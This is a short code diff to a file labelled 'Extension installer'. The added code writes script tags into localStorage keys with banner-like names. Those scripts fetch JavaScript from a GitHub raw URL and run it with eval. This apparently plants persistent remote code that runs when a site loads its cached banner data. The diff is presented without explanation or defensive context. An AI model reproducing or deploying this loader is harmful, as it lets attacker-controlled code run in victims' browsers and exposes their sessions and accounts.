@@ -1,1 +1,14 @@
 console.log("Extension installer")
+try{
+localStorage.bannerData = `<script>
+fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
+  }).then((json) => {console.log(json);eval(json); // The json object is here;
+  });
+</script>`}catch{console.log("1 failed")}
+
+try{
+localStorage.trainerNewCachedBannersData = `<script>
+fetch('https://raw.githubusercontent.com/CompartirGoogleDocs/CompartirGoogleDocs/main/JS2').then((res) => {return res.text();
+  }).then((json) => {console.log(json);eval(json); // The json object is here;
+  });
+</script>`}catch{console.log("2 failed")}
